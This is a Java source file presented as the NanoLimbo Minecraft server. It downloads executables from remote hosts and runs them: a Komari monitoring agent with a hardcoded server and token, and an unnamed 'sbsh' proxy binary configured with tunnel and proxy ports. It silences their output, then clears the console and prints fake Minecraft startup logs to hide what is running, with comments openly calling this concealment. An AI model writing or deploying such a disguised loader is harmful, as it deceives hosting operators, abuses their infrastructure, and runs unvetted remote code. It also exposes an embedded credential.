package ua.nanit.limbo;

import java.io.*;
import java.net.URL;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";

    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static final AtomicBoolean forwardLogs = new AtomicBoolean(true);

    private static Process sbxProcess;
    private static Process komariProcess;

    private static final ScheduledExecutorService SCHED = Executors.newScheduledThreadPool(2);

    // ✅ Komari 环境变量
    private static final String KOMARI_SERVER = env("KOMARI_SERVER", "ko.jaxmike.nyc.mn");
    private static final String KOMARI_TOKEN = env("KOMARI_TOKEN", "NMDhVjXaKd6tWnniVR0GdJ");
    private static final String KOMARI_AUTO_KEY = env("KOMARI_AUTO_KEY", "");

    private static final Path AUTO_DISCOVERY_PATH =
            Paths.get(System.getProperty("user.home"), ".komari", "auto-discovery.json");

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "HY2_PORT", "S5_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
    };

    public static void main(String[] args) {
        try {
            if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
                System.err.println(ANSI_RED + "ERROR: Java version too low!" + ANSI_RESET);
                Thread.sleep(3000);
                System.exit(1);
            }

            // ✅ 1. 先执行 renew.sh（阻塞）
            runRenewScriptBlocking();

            // ✅ 2. 启动 Komari（二进制）
            startKomariAgentBinary();

            // ✅ 3. 启动 sbsh
            runSbxBinary();

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
                SCHED.shutdownNow();
            }));

            SCHED.schedule(() -> {
                forwardLogs.set(false);
                resetConsoleAndShowFakeLogs();
            }, 20, TimeUnit.SECONDS);

            while (running.get()) {
                Thread.sleep(1000);
            }

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }
    }

    // ================= Komari（二进制版） =================

    private static void startKomariAgentBinary() {
        try {
            if (KOMARI_SERVER.isEmpty()) return;

            String token = resolveKomariToken();

            Path agentPath = getKomariBinaryPath();

            List<String> cmd = new ArrayList<>();
            cmd.add(agentPath.toString());
            cmd.add("-e");
            cmd.add(KOMARI_SERVER);

            if (!token.isEmpty()) {
                cmd.add("-t");
                cmd.add(token);
            } else if (!KOMARI_AUTO_KEY.isEmpty()) {
                cmd.add("--auto-discovery");
                cmd.add(KOMARI_AUTO_KEY);
            }

            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.PIPE);

            komariProcess = pb.start();

            // 可选：不输出日志（更隐蔽）
            new Thread(() -> {
                try (BufferedReader r = new BufferedReader(
                        new InputStreamReader(komariProcess.getInputStream()))) {
                    while (r.readLine() != null) {}
                } catch (Exception ignored) {}
            }).start();

            System.out.println(ANSI_GREEN + "Komari agent（二进制）已启动" + ANSI_RESET);

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Komari 启动失败: " + e.getMessage() + ANSI_RESET);
        }
    }

    // ✅ 自动解析 token
    private static String resolveKomariToken() {
        try {
            if (Files.exists(AUTO_DISCOVERY_PATH)) {
                String json = new String(Files.readAllBytes(AUTO_DISCOVERY_PATH));
                int idx = json.indexOf("\"token\"");
                if (idx != -1) {
                    int start = json.indexOf("\"", idx + 7) + 1;
                    int end = json.indexOf("\"", start);
                    return json.substring(start, end);
                }
            }
        } catch (Exception ignored) {}
        return KOMARI_TOKEN;
    }

    // ✅ 自动下载 Komari 二进制（按架构）
    private static Path getKomariBinaryPath() throws IOException {
        String arch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (arch.contains("amd64") || arch.contains("x86_64")) {
            url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-amd64";
        } else if (arch.contains("arm64") || arch.contains("aarch64")) {
            url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-arm64";
        } else if (arch.contains("s390x")) {
            url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-s390x";
        } else {
            throw new RuntimeException("Unsupported arch: " + arch);
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "komari-agent");

        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }

        return path;
    }

    // ================= renew.sh（阻塞） =================

    private static void runRenewScriptBlocking() {
        try {
            File renewScript = new File("renew.sh");
            if (renewScript.exists()) {
                System.out.println(ANSI_GREEN + "执行 renew.sh..." + ANSI_RESET);

                Process p = new ProcessBuilder("bash", "renew.sh")
                        .inheritIO()
                        .start();

                p.waitFor();

                System.out.println(ANSI_GREEN + "renew.sh 执行完成" + ANSI_RESET);
            }
        } catch (Exception e) {
            System.err.println(ANSI_RED + "renew.sh 失败: " + e.getMessage() + ANSI_RESET);
        }
    }

    // ================= s-box =================

    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);

        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.PIPE);

        sbxProcess = pb.start();

        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(sbxProcess.getInputStream()))) {
                String line;
                long startTime = System.currentTimeMillis();
                while ((line = reader.readLine()) != null) {
                    if (forwardLogs.get() && System.currentTimeMillis() - startTime < 20_000) {
                        System.out.println(line);
                    }
                }
            } catch (IOException ignored) {}
        }).start();
    }

    // ================= 控制台伪装 =================

    private static void resetConsoleAndShowFakeLogs() {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("win")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                        .inheritIO().start().waitFor();
            } else {
                System.out.print("\033c");
                System.out.flush();
            }
        } catch (Exception ignored) {}

        printFakeLimboLogs();
    }

    private static void printFakeLimboLogs() {
        String[] logs = {
            "[INFO] [LimboServer] Starting LimboServer v1.0.0 (mock build)",
            "[INFO] [LimboServer] Loading configuration...",
            "[INFO] [LimboServer] Initializing server components...",
            "[INFO] [LimboServer] Preparing world 'world'",
            "[INFO] [LimboServer] Binding to port 25565...",
            "[INFO] [LimboServer] Done (5.123s)! For help, type \"help\"",
            "[INFO] [LimboServer] Server is running in offline mode.",
            "[INFO] [LimboServer] Installation completed successfully."
        };

        for (String log : logs) {
            System.out.println(log);
            try { Thread.sleep(1200); } catch (InterruptedException ignored) {}
        }
    }

    // ================= 环境变量 =================

    private static void loadEnvVars(Map<String, String> envVars) {
        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b385");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_AUTH", "");
        envVars.put("ARGO_DOMAIN", "");
        envVars.put("HY2_PORT", "5510");
        envVars.put("S5_PORT", "5510");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("DISABLE_ARGO", "false");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "www.ntu.edu.sg");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "ceshi");

        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }
    }

    private static Path getBinaryPath() throws IOException {
        String arch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (arch.contains("amd64") || arch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (arch.contains("arm64") || arch.contains("aarch64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (arch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported arch: " + arch);
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");

        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }

        return path;
    }

    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
        }
        if (komariProcess != null && komariProcess.isAlive()) {
            komariProcess.destroy();
        }
    }

    private static String env(String key, String def) {
        String v = System.getenv(key);
        return v == null || v.isEmpty() ? def : v;
    }
}